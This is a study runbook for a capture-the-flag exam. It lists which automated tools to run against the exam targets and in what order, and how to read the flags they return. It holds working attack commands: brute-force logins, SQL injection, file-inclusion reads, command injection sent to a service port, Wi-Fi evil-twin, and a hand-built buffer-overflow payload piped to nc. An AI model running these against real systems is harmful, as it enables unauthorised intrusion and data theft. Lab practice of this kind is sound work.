# Scripts: what to run first

## Goal
Scripts take the first pass on every question; whatever they miss goes to the by-hand note. Never wait on a script: start it, move on.

Two tools:
- `ctf` = classmate's kit (all categories). Installed as a command. Help: `ctf --help` · check the machine: `ctf --doctor $IP`
- `bof-scripts/` = my own (overflow + format string only). Run from the folder that contains `bof-scripts/`.

# Start here: every script first, in this order
```bash
# 0. once
export IP=<target>                                   # second target in the paper → second tab, export IP again there
mkdir -p ~/exam/files && cd ~/exam                   # put EVERY download in ~/exam/files (captures, images, binaries, .c, wordlists)
ctf --doctor $IP                                     # 10 s: tools fine? target answers?

# 1. tab 1 — the long one, start it and LEAVE it (~13 min)
ctf --auto $IP --files ~/exam/files | tee auto.txt

# 2. tab 2 — the quick ones, while tab 1 runs
ctf --enum $IP | tee enum.txt                        # ~2 min: ports, services, web sites → ends with a numbered list
ctf --do 1                                           # run entry 1 of that list, then 2, 3 …   ( ctf --do list )
ctf --folder ~/exam/files | tee files.txt            # every downloaded file: captures, images, hashes, zips

# 3. tab 2 — one line per web page the paper names
ctf --auto-web "http://$IP/page" | tee web.txt

# 4. tab 3 — one line per binary service (nc HOST PORT in the paper)
python3 bof-scripts/go.py $IP $PORT ./chall chall.c  # give the files you have; add  --flag-regex '[A-Za-z0-9]{32}'  if the paper's flags are bare strings
ctf --pwn $IP:$PORT --binary ./chall --src chall.c   # only if go.py ends with NO FLAG

# 5. collect
ctf --show                                           # every flag found so far, and where it came from
grep -aoE '\b[A-Za-z0-9]{32}\b' *.txt | sort -u     # what the flags box may have skipped
grep -aiE 'flag|FLAGSTEG|part [0-9]/[0-9]' *.txt
```
6. Tick off the questions these answered. Each question still open → the table below gives its one script line and its by-hand page.
7. Passwords are never guessed automatically: `--enum` prints the ready `--form-brute` / `--http-brute` / `--brute` line → run it in its own tab.

# Two IPs in the paper: one tab and one folder per target, both at once
```bash
# tab 1: first target
mkdir -p ~/exam/ip1 && cd ~/exam/ip1 && export IP=<first ip>
ctf --auto $IP --files ~/exam/files | tee auto.txt

# tab 2: second target
mkdir -p ~/exam/ip2 && cd ~/exam/ip2 && export IP=<second ip>
ctf --auto $IP --files ~/exam/files | tee auto.txt
```
- Separate folders on purpose: `ctf` writes its findings into `ctf-notes/` in the folder you run it from, and `ctf --show` reads from there. One shared folder = the two targets' results mixed.
- `IP` belongs to the tab. New tab → `cd` into that target's folder and `export IP=…` again (`echo $IP` to check before every command).
- Which questions use which IP? Mark it on the paper first, so each answer is read from the right folder.
- The paper limits scanning for a target ("first 100 ports only", "no nmap") → that target gets `ctf --enum $IP --ports 1-100` or [01_recon](01_recon.md) by hand, NOT `--auto`.
- One starts timing out / a target slows down → stop the second run (Ctrl+C) and do them one after the other.
- `go.py` takes host and port on the command line, so it works from any tab: `python3 ~/exam/bof-scripts/go.py <ip> <port> ./chall` (use the real path to `bof-scripts/`).
- Collect per target: `cd ~/exam/ip1 && ctf --show` · then `cd ~/exam/ip2 && ctf --show` · the `grep` lines from step 5 above work inside each folder.

# Game plan
```bash
export IP=<target>                              # every command below uses $IP
mkdir -p ~/exam/files && cd ~/exam              # EVERY download goes into ~/exam/files: captures, images, binaries, .c files, wordlists
```
**Tab 1: start and leave (≈13 min, do not wait for it)**
```bash
ctf --auto $IP --files ~/exam/files             # scan, every service, every web input, every unknown port, every file
```
**Tab 2: one command per question, while tab 1 runs**

| Question is about | Run | By hand |
|---|---|---|
| the box itself: ports, FTP, SMB, SNMP, DNS, banners, robots, vhosts | `ctf --enum $IP` (≈2 min) then `ctf --do 1` … | [01_recon](01_recon.md) [02_services](02_services.md) |
| a web page, nothing known yet | `ctf --auto-web "http://$IP/page"` | [03_web_enum](03_web_enum.md) |
| hidden folder / file / comment | `ctf --web "http://$IP"` · `ctf --source "http://$IP"` | [03_web_enum](03_web_enum.md) |
| login page | `ctf --try-login "http://$IP/login"` → then `ctf --form-brute "http://$IP/login"` | [04_web_brute](04_web_brute.md) |
| SQL injection | `ctf --find-input "<site or page url>"` → run each line it prints under WHAT TO RUN NEXT (`ctf --sqlmap-auto …` / `ctf --sqli …`) · signed link: `ctf --sig <value> <hash>` names the hash | [05_sqli](05_sqli.md) |
| `?page=` / read a file | `ctf --lfi "curl -s 'http://$IP/x.php?page={P}'" --file <path from the Q>` | [06_lfi](06_lfi.md) |
| command box / XSS | `ctf --inject "curl -s '<url>?name={P}'"` | [14_web_inject](14_web_inject.md) |
| hash / locked zip, pdf, ssh key | `ctf --crack <hash or file>` | [07_crack](07_crack.md) |
| any downloaded file | `ctf --analyze <file>` · whole folder: `ctf --folder ~/exam/files` | [08_stego_forensics](08_stego_forensics.md) |
| image / audio | `ctf --stegchain <image>` · PNG: add `--lsb` | [08_stego_forensics](08_stego_forensics.md) |
| unreadable string | `ctf --decode "<string>"` | [09_decode](09_decode.md) |
| Wi-Fi capture | `ctf --wifi-crack <cap>` · `ctf --wifi-hidden <cap>` · `ctf --evil-twin <cap>` | [10_wireless](10_wireless.md) |
| plain capture (logins in clear text) | `ctf --pcap <cap>` | [08_stego_forensics](08_stego_forensics.md) |
| port that takes commands | `ctf --banner $IP:$PORT --send 'id; ls -la; cat flag*'` | [14_web_inject](14_web_inject.md) |
| overflow / format string | see below | [12_bof](12_bof.md) [13_fmt](13_fmt.md) |
| a name / term from the slides | `grep -rniE '<word>' <notes folder>` | |

# Binary service (overflow / format string): my scripts FIRST, kit second
```bash
python3 bof-scripts/go.py $IP $PORT ./chall chall.c paper.txt     # give what you have, any order; none is fine. paper.txt = anything the Q says, typed into a file
python3 bof-scripts/go.py                                         # same, it asks
ctf --pwn $IP:$PORT --binary ./chall --src chall.c                # 2nd door. ALWAYS pass the binary when one was given
```
- `go.py` usually answers in under a minute (3–8 s for the plain shapes, ~40 s when it has to sweep `%n` slots, ~55 s on a statically linked binary). Nothing after ~3 min → Ctrl+C → `ctf --pwn` in its own tab. Both failed → by hand.
- `go.py` handles: overflow to a flag function whatever its name, with a PIN or a menu in front, static or normal build · format-string leak · `%n` that must make a variable non-zero (with source, binary or nothing).
- `go.py` still MISSES when it is given NO binary and the address is not printed up front (hidden behind a menu option, or never printed) → give it the binary, or write the address in `paper.txt` (`flag function at 0x…`), or by hand: [12_bof](12_bof.md) section G.
- flag function not obvious? `objdump -d ./chall | grep '>:$'` → the function `main` never calls that opens the flag file.
- format string only: `python3 bof-scripts/fmtpwn.py $IP $PORT --binary ./chall` (`--pre 2` = answer a menu first)
- more flags: `bof-scripts/RUNBOOK.md`

# Reading the result
`ctf` ends every run with a box **FLAGS FOUND IN THIS RUN**. The box lists only:
- `ehCTF{…}` `SIT{…}` `flag{…}` `…CTF{…}` (any letter case), also when hidden as base64 / hex / ROT13 / backwards
- bare strings of EXACTLY 32 letters+digits that mix lower case, upper case and digits

NOT in the box, but still in the output above it → **scroll up and read**:
- 32 hex characters (md5 look) · all-capitals or letters-only strings · any other length (24, 40 …)
- base64 with `+` `/` `=` · base64 that decodes to a plain word → `ctf --decode "<string>"`
- plain answers: a name, a version, a place, a username, a password
```bash
export FLAGFMT=WORD            # paper uses another wrapper WORD{…} → the box then lists it
ctf --show                     # every flag and finding so far
```
Box empty, or fewer flags than questions → keep the output and search it yourself:
```bash
ctf --enum $IP | tee out.txt                              # add  | tee out.txt  to ANY ctf command: same output on screen + saved
grep -aoE '\b[0-9a-f]{32}\b' out.txt | sort -u            # 32-character hex answers (the box skips these)
grep -aoE '\b[A-Za-z0-9]{32}\b' out.txt | sort -u         # any 32 letters+digits
grep -aiE 'flag|FLAGSTEG|part [0-9]/[0-9]' out.txt        # labelled answers, steghide text, pieces of a split flag (join them in order)
```
Half a flag (`WORD{first_half_` here, `_second_half}` somewhere else) and plain answers (a name, a password) have no shape: only reading finds them.

**`bof-scripts` says "NO FLAG" — contingency, in this order** (do not read the whole screen):

Why it can happen on a correct exploit: the script only knows it won when the reply LOOKS like a flag (a wrapper `WORD{…}`, a "flag: …" label, or 16–64 hex characters). A service that just prints `Congratulations! 2xkC…Kzn9` is not recognised: the script carries on for 3 minutes, ends with "NO FLAG", and the winning reply is neither shown nor saved.
```bash
# 1. run it again and tell it what success looks like (5 s when this was the reason)
python3 bof-scripts/go.py $IP $PORT ./chall --flag-regex '(?i)(congrat|granted|unlock|well done|you win)[^\n]*'
python3 bof-scripts/go.py $IP $PORT ./chall --flag-regex '[A-Za-z0-9]{32}'      # the paper's other flags are bare 32-character strings → say so from the START

# 2. still nothing → watch what the service really answers. The failed run ends with a numbered list of commands
#    ("1. ret2win … python3 …/auto_pwn.py --host … --port …"). Copy the FIRST one, add --verbose, keep the output:
<that auto_pwn.py command> --verbose | tee v.txt
grep -avE '^\[|^=|^$' v.txt | sort | uniq -c | sort -n | head -20        # the service's own lines, rarest first: the line seen ONCE is the win
grep -aiE 'congrat|grant|unlock|flag|\{' v.txt                            # or look for the usual success words
#    format string instead:  python3 bof-scripts/fmtpwn.py $IP $PORT --binary ./chall --verbose | tee v.txt

# 3. still nothing → by hand with the numbers the script already found (its report lists "RET offset candidates" and the address):
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*<offset> + struct.pack("<I",0x<address>) + b"\n")' | nc -w3 $IP $PORT     # 64-bit: "<Q"
```
Then `ctf --pwn $IP:$PORT --binary ./chall` in another tab, and [12_bof](12_bof.md) / [13_fmt](13_fmt.md).

### Helpline
```bash
# ctf: command not found → bash <kit folder>/ctf-auto.sh <same arguments>
# a ctf run prints "ctf --do N" suggestions → they are the next step, run them.
# --auto still on a binary port after minutes → leave it; do that port yourself with go.py in tab 2.
# a script says "plain value" / "the program said something new" with no flag → treat as NOT solved, check by hand.
# password guessing is never started by --enum / --auto → run the printed --form-brute / --brute / --ssh-brute line in its own tab.
# never point a script at the CTFd scoreboard site, only at targets the paper names.
```
